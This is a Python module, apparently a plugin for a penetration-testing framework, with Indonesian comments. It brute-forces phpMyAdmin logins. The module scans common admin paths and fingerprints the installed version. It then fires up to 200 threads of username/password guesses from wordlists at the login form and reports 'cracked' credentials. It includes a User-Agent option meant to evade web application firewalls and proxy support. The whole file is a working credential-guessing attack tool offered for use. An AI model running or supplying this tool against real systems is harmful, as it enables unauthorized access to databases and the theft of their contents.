import requests
import threading
import time
from pathlib import Path
import sys
import random
import concurrent.futures
from queue import Queue
import re
import urllib.parse

# Suppress SSL warnings
try:
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except:
        pass

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

# Rich untuk table
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich import box
    from rich.text import Text
    from rich.columns import Columns
    from rich.align import Align
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False

MODULE_INFO = {
    "name": "bruteforce/phpmyadmin_ultrafast",
    "description": "Ultra fast phpMyAdmin bruteforce dengan progress bar yang tepat"
}

OPTIONS = {
    "TARGET": {
        "required": True,
        "default": "http://localhost/phpmyadmin",
        "description": "Target URL phpMyAdmin"
    },
    "USERNAME": {
        "required": True,
        "default": "root",
        "description": "Username atau file berisi usernames"
    },
    "PASSWORD": {
        "required": True, 
        "default": "password",
        "description": "Password atau file berisi passwords"
    },
    "USER_AGENT": {
        "required": False,
        "default": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "description": "User-Agent untuk bypass WAF"
    },
    "THREADS": {
        "required": False,
        "default": "50",
        "description": "Jumlah threads (1-200)"
    },
    "DELAY": {
        "required": False,
        "default": "0.01",
        "description": "Delay antara request (detik)"
    },
    "TIMEOUT": {
        "required": False,
        "default": "3",
        "description": "Timeout request (detik)"
    },
    "SSL_VERIFY": {
        "required": False,
        "default": "false",
        "description": "Verify SSL certificate (true/false)"
    },
    "PROXY": {
        "required": False,
        "default": "",
        "description": "Proxy server (optional)"
    },
    "MAX_ATTEMPTS": {
        "required": False,
        "default": "50000",
        "description": "Maximum attempts sebelum berhenti"
    }
}

def display_header():
    """Display header panel yang menarik"""
    if not RICH_AVAILABLE:
        return
    
    header_text = Text()
    header_text.append("🚀 ", style="bold red")
    header_text.append("ULTRA FAST ", style="bold yellow")
    header_text.append("PHPMyAdmin ", style="bold cyan")
    header_text.append("BRUTEFORCE", style="bold green")
    
    sub_text = Text()
    sub_text.append("⚡ ", style="bold yellow")
    sub_text.append("High-Speed Credential Testing Tool", style="bold white")
    
    header_panel = Panel(
        Align.center(header_text + "\n" + sub_text),
        border_style="bright_blue",
        padding=(1, 2),
        style="bold"
    )
    
    console.print(header_panel)

class UltraFastTargetScanner:
    """Class untuk scanning target yang ultra cepat"""
    
    def __init__(self, base_target, headers, ssl_verify, timeout, proxies):
        self.base_target = base_target
        self.headers = headers
        self.ssl_verify = ssl_verify
        self.timeout = timeout
        self.proxies = proxies
        self.found_paths = []
    
    def scan_paths(self):
        """Scan path dengan threading maksimal"""
        common_paths = [
            "", "/phpmyadmin", "/pma", "/myadmin", "/admin", 
            "/mysql", "/dbadmin", "/PMA", "/phpMyAdmin",
            "/web/phpmyadmin", "/db/phpmyadmin", "/sql/phpmyadmin",
            "/phpMyAdmin-5.1", "/phpMyAdmin-5.0", "/phpMyAdmin-4.9"
        ]
        
        if RICH_AVAILABLE:
            console.print(Panel(
                "🔍 [bold cyan]Target Discovery Phase[/bold cyan]\n"
                "🔄 Scanning common phpMyAdmin paths...",
                border_style="cyan",
                padding=(1, 2)
            ))
        
        # Progress bar untuk scanning
        if TQDM_AVAILABLE:
            progress_bar = tqdm(
                common_paths,
                desc="Scanning Paths",
                unit="path",
                ncols=70,
                bar_format="{l_bar}{bar:30}| {n_fmt}/{total_fmt} paths"
            )
        else:
            progress_bar = common_paths
        
        for path in progress_bar:
            test_url = f"{self.base_target.rstrip('/')}{path}"
            status_info = self.check_url_status(test_url)
            
            if status_info["accessible"]:
                self.found_paths.append(status_info)
                if TQDM_AVAILABLE:
                    progress_bar.set_description(f"✅ Found: {path}")
                break
        
        if TQDM_AVAILABLE:
            progress_bar.close()
        
        # Tampilkan hasil scan
        if self.found_paths and RICH_AVAILABLE:
            self.display_scan_results()
        
        return self.found_paths
    
    def check_url_status(self, url):
        """Check status URL dengan version detection yang lebih baik"""
        try:
            response = requests.get(
                url,
                headers=self.headers,
                verify=self.ssl_verify,
                timeout=5,
                proxies=self.proxies,
                allow_redirects=True
            )
            
            html = response.text
            final_url = response.url
            
            # Enhanced version detection dengan multiple methods
            version = self.detect_phpmyadmin_version(final_url, html, response.headers)
            
            accessible = response.status_code in [200, 301, 302, 401, 403]
            
            return {
                "url": final_url,
                "status_code": response.status_code,
                "accessible": accessible,
                "ssl": final_url.startswith("https"),
                "server": response.headers.get('Server', 'N/A'),
                "x_powered_by": response.headers.get('X-Powered-By', 'N/A'),
                "title": self.extract_title(html),
                "version": version,
                "content_length": len(html),
            }
            
        except Exception as e:
            return {
                "url": url, 
                "status_code": "ERROR", 
                "accessible": False, 
                "version": "Unknown",
                "error": str(e)
            }
    
    def detect_phpmyadmin_version(self, url, html, headers):
        """Detect phpMyAdmin version dengan multiple advanced methods"""
        version = "Unknown"
        
        # Method 1: Check HTML content patterns
        version = self.extract_version_from_html(html)
        if version != "Unknown":
            return version
        
        # Method 2: Check specific version files
        version = self.check_version_files(url)
        if version != "Unknown":
            return version
        
        # Method 3: Check JavaScript files
        version = self.check_js_files(html, url)
        if version != "Unknown":
            return version
        
        # Method 4: Check CSS files
        version = self.check_css_files(html, url)
        if version != "Unknown":
            return version
        
        # Method 5: Check response headers
        version = self.check_headers_for_version(headers)
        if version != "Unknown":
            return version
        
        # Method 6: Check URL path patterns
        version = self.check_url_for_version(url)
        if version != "Unknown":
            return version
        
        # Method 7: Check common phpMyAdmin files
        version = self.check_common_pma_files(url)
        if version != "Unknown":
            return version
        
        return "Unknown"
    
    def extract_version_from_html(self, html):
        """Extract version dari HTML dengan patterns yang lebih komprehensif"""
        if not html:
            return "Unknown"
        
        text = html[:300000]  # Batasi untuk performance
        
        # Enhanced patterns untuk phpMyAdmin version detection
        patterns = [
            # Pattern 1: <!-- phpMyAdmin X.X.X -->
            r'phpMyAdmin[^<]*?([0-9]+\.[0-9]+\.[0-9]+)',
            # Pattern 2: Version: X.X.X
            r'Version[:\s]*([0-9]+\.[0-9]+\.[0-9]+)',
            # Pattern 3: vX.X.X
            r'v([0-9]+\.[0-9]+\.[0-9]+)',
            # Pattern 4: phpMyAdmin X.X
            r'phpMyAdmin[^0-9]*([0-9]+\.[0-9]+)',
            # Pattern 5: PMA_VERSION
            r'PMA_VERSION[\s]*=[\s]*["\']([0-9\.]+)["\']',
            # Pattern 6: Config version
            r'\$.*?version[\s]*=[\s]*["\']([0-9\.]+)["\']',
            # Pattern 7: Meta generator
            r'<meta[^>]*content=["\'][^"\']*phpMyAdmin[^"\']*([0-9\.]+)',
            # Pattern 8: Title version
            r'<title>[^<]*phpMyAdmin[^<]*([0-9\.]+)',
            # Pattern 9: Footer version
            r'phpMyAdmin[^<]+([0-9]+\.[0-9]+\.[0-9]+)',
            # Pattern 10: Inline version info
            r'phpMyAdmin[\s\S]{0,200}?([0-9]+\.[0-9]+\.[0-9]+)',
        ]
        
        for pattern in patterns:
            try:
                matches = re.findall(pattern, text, re.IGNORECASE)
                for match in matches:
                    if self.is_valid_version(match):
                        return match
            except:
                continue
        
        return "Unknown"
    
    def check_version_files(self, base_url):
        """Check file-file yang biasanya mengandung version info"""
        version_files = [
            "/README", "/README.md", "/DOCUMENTATION",
            "/ChangeLog", "/CHANGELOG", "/RELEASE-DATE",
            "/composer.json", "/package.json",
            "/libraries/classes/Config.php",
            "/libraries/common.inc.php",
            "/doc/html/index.html",
            "/Documentation.html"
        ]
        
        for vfile in version_files:
            try:
                file_url = urllib.parse.urljoin(base_url, vfile)
                response = requests.get(
                    file_url,
                    headers=self.headers,
                    verify=self.ssl_verify,
                    timeout=3,
                    proxies=self.proxies
                )
                if response.status_code == 200:
                    version = self.extract_version_from_text(response.text)
                    if version != "Unknown":
                        return f"{version} (from {vfile})"
            except:
                continue
        
        return "Unknown"
    
    def check_js_files(self, html, base_url):
        """Check JavaScript files untuk version info"""
        script_patterns = [
            r'<script[^>]+src=["\']([^"\']+\.js)["\']',
            r'src=["\'](js/[^"\']+\.js)["\']',
            r'src=["\'](\./js/[^"\']+\.js)["\']'
        ]
        
        all_scripts = []
        for pattern in script_patterns:
            all_scripts.extend(re.findall(pattern, html, re.IGNORECASE))
        
        # Prioritize main scripts
        priority_scripts = ['common.js', 'config.js', 'functions.js', 'main.js', 'navigation.js']
        for script in priority_scripts:
            if any(script in s for s in all_scripts):
                try:
                    script_url = urllib.parse.urljoin(base_url, script)
                    response = requests.get(
                        script_url,
                        headers=self.headers,
                        verify=self.ssl_verify,
                        timeout=3,
                        proxies=self.proxies
                    )
                    if response.status_code == 200:
                        version = self.extract_version_from_text(response.text)
                        if version != "Unknown":
                            return version
                except:
                    continue
        
        return "Unknown"
    
    def check_css_files(self, html, base_url):
        """Check CSS files untuk version info"""
        css_pattern = r'<link[^>]+href=["\']([^"\']+\.css)["\']'
        css_files = re.findall(css_pattern, html, re.IGNORECASE)
        
        for css_file in css_files[:3]:  # Check first 3 CSS files
            try:
                css_url = urllib.parse.urljoin(base_url, css_file)
                response = requests.get(
                    css_url,
                    headers=self.headers,
                    verify=self.ssl_verify,
                    timeout=3,
                    proxies=self.proxies
                )
                if response.status_code == 200:
                    # CSS biasanya punya comment dengan version
                    if 'phpMyAdmin' in response.text:
                        version = self.extract_version_from_text(response.text)
                        if version != "Unknown":
                            return version
            except:
                continue
        
        return "Unknown"
    
    def check_headers_for_version(self, headers):
        """Check response headers untuk version info"""
        header_checks = [
            'X-Powered-By',
            'Server',
            'X-Generator',
            'X-Version'
        ]
        
        for header in header_checks:
            value = headers.get(header, '')
            if 'phpmyadmin' in value.lower():
                version = self.extract_version_from_text(value)
                if version != "Unknown":
                    return f"{version} (from {header})"
        
        return "Unknown"
    
    def check_url_for_version(self, url):
        """Check URL pattern untuk version clues"""
        patterns = [
            r'phpmyadmin[-\s]*([0-9]+\.[0-9]+\.[0-9]+)',
            r'phpmyadmin[-\s]*([0-9]+\.[0-9]+)',
            r'pma[-\s]*([0-9]+\.[0-9]+)',
            r'phpMyAdmin-([0-9]+\.[0-9]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, url, re.IGNORECASE)
            for match in matches:
                if self.is_valid_version(match):
                    return match
        
        return "Unknown"
    
    def check_common_pma_files(self, base_url):
        """Check common phpMyAdmin files untuk version info"""
        common_files = [
            "/version.txt",
            "/VERSION",
            "/LICENSE",
            "/AUTHORS",
            "/translators.html"
        ]
        
        for file_path in common_files:
            try:
                file_url = urllib.parse.urljoin(base_url, file_path)
                response = requests.get(
                    file_url,
                    headers=self.headers,
                    verify=self.ssl_verify,
                    timeout=3,
                    proxies=self.proxies
                )
                if response.status_code == 200:
                    version = self.extract_version_from_text(response.text)
                    if version != "Unknown":
                        return f"{version} (from {file_path})"
            except:
                continue
        
        return "Unknown"
    
    def extract_version_from_text(self, text):
        """Extract version dari text biasa"""
        if not text:
            return "Unknown"
        
        patterns = [
            r'([0-9]+\.[0-9]+\.[0-9]+)',
            r'([0-9]+\.[0-9]+)',
            r'v([0-9]+\.[0-9]+\.[0-9]+)',
            r'version[:\s]*([0-9\.]+)'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                if self.is_valid_version(match):
                    return match
        
        return "Unknown"
    
    def is_valid_version(self, version_str):
        """Validate jika string adalah version yang valid"""
        if not version_str:
            return False
        
        # Basic version pattern: X.X atau X.X.X
        if re.match(r'^\d+\.\d+(\.\d+)?$', version_str):
            parts = version_str.split('.')
            # Pastikan tidak terlalu besar (misal IP address)
            if all(0 <= int(part) < 1000 for part in parts if part.isdigit()):
                # Pastikan ini versi phpMyAdmin yang realistic
                major_version = int(parts[0])
                if 2 <= major_version <= 5:  # phpMyAdmin biasanya v2-v5
                    return True
        
        return False
    
    def extract_title(self, html):
        """Extract title dari HTML"""
        title_match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return title_match.group(1) if title_match else "No Title"
    
    def display_scan_results(self):
        """Display hasil scanning dengan panel"""
        if not self.found_paths:
            return
        
        table = Table(
            title="🎯 Target Discovery Results", 
            box=box.DOUBLE_EDGE, 
            show_header=True, 
            header_style="bold magenta"
        )
        table.add_column("Status", style="bold", width=30)
        table.add_column("URL", style="cyan", overflow="fold", width=30)
        table.add_column("Code", justify="center", width=30)
        table.add_column("Server", style="yellow", width=30)
        table.add_column("SSL", justify="center", width=30)
        table.add_column("Version", style="bold green", justify="center", width=30, overflow="fold")
        #table.add_column("Title", style="green", width=30, overflow="fold")
        
        for result in self.found_paths:
            status_emoji = self.get_status_emoji(result['status_code'])
            ssl_icon = "🔐" if result["ssl"] else "🌐"
            status_code = result['status_code']
            version = result.get("version", "Unknown")
            
            # Color code version
            version_display = version
            if version != "Unknown":
                version_display = f"[green]{version}[/green]"
            else:
                version_display = f"[yellow]{version}[/yellow]"
            
            table.add_row(
                f"{status_emoji}",
                f"{result['url']}",
                f"[bold]{status_code}[/bold]",
                result['server'][:15],
                ssl_icon,
                version_display,
                result['title'][:25] if result['title'] != "No Title" else "No Title"
            )
        
        results_panel = Panel(
            table,
            title="📊 SCAN COMPLETED",
            border_style="green",
            padding=(1, 1)
        )
        
        console.print(results_panel)
    
    def get_status_emoji(self, status_code):
        """Get emoji untuk status code"""
        emoji_map = {
            200: "✅", 301: "🔄", 302: "🔄", 
            403: "🚫", 401: "🔐", 500: "💥"
        }
        return emoji_map.get(status_code, "❓")

class UltraFastLoginChecker:
    """Class untuk cek login yang ultra cepat"""
    
    @staticmethod
    def check_login_success(response):
        """Check login success dengan method yang sangat cepat"""
        text = response.text.lower()
        
        # Very quick success checks
        if any(indicator in text for indicator in ["mainframeset", "navigation.php", "server version", "frameborder"]):
            return True
        
        # Very quick failure checks  
        if any(indicator in text for indicator in ["access denied", "cannot log in", "login"]):
            return False
        
        # Quick content-based decision
        return len(response.text) > 3000 and "login" not in text

# ... (Class UltraFastPhpMyAdminBruteforce dan function run tetap sama seperti sebelumnya)

class UltraFastPhpMyAdminBruteforce:
    """Main class untuk bruteforce dengan progress bar yang tepat"""
    
    def __init__(self, options):
        self.options = options
        
        # Initialize queue FIRST before any other methods
        self.credential_queue = Queue()
        self.results = {
            "found_credentials": [],
            "attempts": 0,
            "successful_attempts": 0,
        }
        self.stop_event = threading.Event()
        self.credentials_found = False
        
        # Now setup components that use the queue
        self.setup_components()
    
    def setup_components(self):
        """Setup komponen"""
        self.headers = {
            'User-Agent': self.options.get("USER_AGENT"),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }
        
        self.ssl_verify = self.options.get("SSL_VERIFY", "false").lower() == "true"
        self.timeout = int(self.options.get("TIMEOUT", "3"))
        self.threads = max(1, min(200, int(self.options.get("THREADS", "50"))))
        self.delay = float(self.options.get("DELAY", "0.01"))
        self.max_attempts = int(self.options.get("MAX_ATTEMPTS", "50000"))
        
        # Setup proxies
        self.proxies = {}
        proxy = self.options.get("PROXY", "").strip()
        if proxy:
            self.proxies = {"http": proxy, "https": proxy}
        
        # Load credentials dan buat queue
        self.load_credentials_to_queue()
        
        # Initialize components
        self.target_scanner = UltraFastTargetScanner(
            self.options.get("TARGET", ""),
            self.headers,
            self.ssl_verify,
            self.timeout,
            self.proxies
        )
        
        self.login_checker = UltraFastLoginChecker()
        
        # Threading
        self.lock = threading.Lock()
        self.progress_bar = None
    
    def load_credentials_to_queue(self):
        """Load semua credentials ke dalam queue untuk progress yang tepat"""
        usernames = self.load_wordlist(self.options.get("USERNAME", ""))
        passwords = self.load_wordlist(self.options.get("PASSWORD", ""))
        
        total_combinations = len(usernames) * len(passwords)
        
        if RICH_AVAILABLE:
            console.print(Panel(
                f"📊 [cyan]Credential Queue Preparation[/cyan]\n"
                f"👥 Usernames: [yellow]{len(usernames)}[/yellow]\n"
                f"🔑 Passwords: [yellow]{len(passwords)}[/yellow]\n"
                f"🎯 Total Combinations: [red]{total_combinations:,}[/red]",
                border_style="blue",
                padding=(1, 2)
            ))
        
        # Masukkan semua kombinasi ke queue
        for username in usernames:
            for password in passwords:
                if self.credential_queue.qsize() < self.max_attempts:
                    self.credential_queue.put((username, password))
                else:
                    break
        
        self.total_attempts = min(total_combinations, self.max_attempts)
    
    def load_wordlist(self, input_str):
        """Load wordlist"""
        try:
            if Path(input_str).is_file():
                with open(input_str, 'r', encoding='utf-8', errors='ignore') as f:
                    return [line.strip() for line in f if line.strip()]
            else:
                return [input_str]
        except:
            return [input_str]
    
    def create_session(self):
        """Create session dengan connection pooling"""
        session = requests.Session()
        session.headers.update(self.headers)
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=1
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        return session
    
    def run(self):
        """Main execution"""
        if RICH_AVAILABLE:
            console.print(Panel(
                "🚀 [bold green]ULTRA FAST PHPMyAdmin BRUTEFORCE[/bold green]",
                border_style="green"
            ))
        
        # Phase 1: Fast Target Scanning
        found_paths = self.target_scanner.scan_paths()
        if not found_paths:
            if RICH_AVAILABLE:
                console.print(Panel(
                    "❌ [bold red]TARGET DISCOVERY FAILED[/bold red]\n"
                    "No accessible phpMyAdmin paths found!",
                    border_style="red",
                    padding=(1, 2)
                ))
            return
        
        target_url = found_paths[0]["url"]
        
        # Phase 2: Ultra Fast Bruteforce dengan Progress Bar yang Tepat
        self.start_bruteforce_with_proper_progress(target_url)
        
        # Phase 3: Results
        self.display_final_results()
    
    def start_bruteforce_with_proper_progress(self, target_url):
        """Start bruteforce dengan progress bar yang tepat"""
        if RICH_AVAILABLE:
            console.print(Panel(
                f"🔥 [bold red]BRUTEFORCE CONFIGURATION[/bold red]\n"
                f"🎯 Target: [cyan]{target_url}[/cyan]\n"
                f"📊 Total Combinations: [yellow]{self.total_attempts:,}[/yellow]\n"
                f"🚀 Threads: [green]{self.threads}[/green]\n"
                f"⚡ Delay: [blue]{self.delay}s[/blue]",
                border_style="red",
                padding=(1, 2)
            ))
        
        # Setup progress bar dengan total yang tepat
        if TQDM_AVAILABLE:
            self.progress_bar = tqdm(
                total=self.total_attempts,
                desc="Bruteforcing",
                unit="attempt",
                ncols=80,
                bar_format="{l_bar}{bar:40}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]"
            )
        else:
            console.print(f"🔄 Starting bruteforce with {self.total_attempts:,} combinations...")
        
        start_time = time.time()
        
        # Start worker threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(
                target=self.bruteforce_worker, 
                args=(target_url,),
                name=f"Worker-{i+1}"
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Monitor progress
        try:
            while (not self.stop_event.is_set() and 
                   self.results["attempts"] < self.total_attempts and
                   not self.credentials_found):
                
                time.sleep(0.1)
                
                # Check jika semua kombinasi sudah dicoba
                if self.credential_queue.empty():
                    break
                    
        except KeyboardInterrupt:
            self.stop_event.set()
            if RICH_AVAILABLE:
                console.print("\n🛑 [yellow]Bruteforce interrupted by user[/yellow]")
        
        # Tunggu semua thread selesai
        self.stop_event.set()
        for thread in threads:
            thread.join(timeout=2)
        
        elapsed_time = time.time() - start_time
        
        if TQDM_AVAILABLE and self.progress_bar:
            self.progress_bar.close()
        
        if RICH_AVAILABLE:
            attempts_per_second = self.results["attempts"] / elapsed_time if elapsed_time > 0 else 0
            console.print(Panel(
                f"⏰ [cyan]Execution Time:[/cyan] {elapsed_time:.2f} seconds\n"
                f"📈 [green]Speed:[/green] {attempts_per_second:,.1f} attempts/second\n"
                f"🎯 [yellow]Status:[/yellow] {'COMPLETED' if not self.credentials_found else 'CREDENTIALS FOUND'}",
                title="📊 EXECUTION SUMMARY",
                border_style="cyan",
                padding=(1, 2)
            ))
    
    def bruteforce_worker(self, target_url):
        """Worker thread untuk bruteforce"""
        session = self.create_session()
        
        while (not self.stop_event.is_set() and 
               not self.credentials_found and
               self.results["attempts"] < self.total_attempts):
            
            try:
                # Ambil credential dari queue dengan timeout
                username, password = self.credential_queue.get(timeout=1)
            except:
                break  # Queue kosong atau timeout
            
            success = self.try_login(session, target_url, username, password)
            
            with self.lock:
                self.results["attempts"] += 1
                
                if success:
                    self.results["successful_attempts"] += 1
                    self.results["found_credentials"].append((username, password))
                    self.credentials_found = True
                    self.stop_event.set()
                    
                    if RICH_AVAILABLE:
                        console.print("\n")
                        success_panel = Panel(
                            f"🎉 [bold green]CREDENTIALS SUCCESSFULLY CRACKED![/bold green]\n\n"
                            f"👤 [cyan]Username:[/cyan] {username}\n"
                            f"🔑 [yellow]Password:[/yellow] {password}\n"
                            f"📊 [blue]Attempts Made:[/blue] {self.results['attempts']:,}\n"
                            f"⏰ [magenta]Progress:[/magenta] {self.results['attempts']:,}/{self.total_attempts:,}",
                            title="💎 SUCCESS",
                            border_style="bright_green",
                            padding=(2, 3)
                        )
                        console.print(success_panel)
            
            # Update progress bar
            if TQDM_AVAILABLE and self.progress_bar:
                self.progress_bar.update(1)
            
            # Delay
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Tandai task selesai
            self.credential_queue.task_done()
        
        session.close()
    
    def try_login(self, session, target_url, username, password):
        """Attempt login"""
        login_url = f"{target_url}/index.php"
        
        try:
            # Get login page
            response = session.get(
                login_url,
                verify=self.ssl_verify,
                timeout=2,
                proxies=self.proxies
            )
            
            # Simple login data
            data = {
                'pma_username': username,
                'pma_password': password,
                'server': '1',
            }
            
            # Attempt login
            response = session.post(
                login_url,
                data=data,
                verify=self.ssl_verify,
                timeout=2,
                proxies=self.proxies,
                allow_redirects=True
            )
            
            return self.login_checker.check_login_success(response)
                
        except:
            return False
    
    def display_final_results(self):
        """Display results"""
        if not RICH_AVAILABLE:
            return
            
        console.print("\n" + "="*60)
        
        summary_content = (
            f"🎯 [bold cyan]Target:[/bold cyan] {self.options.get('TARGET')}\n"
            f"⏰ [bold yellow]Total Attempts:[/bold yellow] {self.results['attempts']:,}\n"
            f"✅ [bold green]Successful Logins:[/bold green] {self.results['successful_attempts']}\n"
            f"🔑 [bold red]Credentials Found:[/bold red] {len(self.results['found_credentials'])}\n"
            f"📊 [bold magenta]Total Combinations:[/bold magenta] {self.total_attempts:,}"
        )
        
        summary_panel = Panel(
            summary_content,
            title="📊 FINAL RESULTS SUMMARY",
            border_style="bright_blue",
            padding=(1, 2)
        )
        
        console.print(summary_panel)
        
        if self.results["found_credentials"]:
            table = Table(
                title="🎉 CRACKED CREDENTIALS", 
                box=box.DOUBLE_EDGE, 
                header_style="bold green"
            )
            table.add_column("Username", style="bold white", justify="center")
            table.add_column("Password", style="bold yellow", justify="center")
            table.add_column("Status", style="bold green", justify="center")
            
            for username, password in self.results["found_credentials"]:
                table.add_row(username, password, "✅ VALID")
            
            credentials_panel = Panel(
                table,
                title="💎 SUCCESSFUL CRACKS",
                border_style="green",
                padding=(1, 1)
            )
            
            console.print(credentials_panel)
        else:
            console.print(Panel(
                "❌ [bold red]No valid credentials found during bruteforce[/bold red]\n"
                f"💡 Tried {self.results['attempts']:,} combinations\n"
                "💡 Try using different wordlists or target",
                border_style="red",
                padding=(1, 2)
            ))
        
        console.print("="*60)

def run(session, options):
    """Main function"""
    bruteforcer = UltraFastPhpMyAdminBruteforce(options)
    bruteforcer.run()
